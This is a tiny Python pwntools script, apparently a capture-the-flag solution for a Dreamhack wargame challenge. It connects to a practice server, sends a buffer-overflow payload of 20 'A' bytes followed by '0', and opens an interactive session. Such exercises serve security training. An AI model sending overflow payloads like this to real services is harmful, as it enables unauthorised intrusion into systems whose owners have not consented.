from pwn import *

connection = remote('host1.dreamhack.games' , 17963) 

buf = b'A'*20
age = b'0'
pload = buf+age

connection.sendline(pload)
connection.interactive()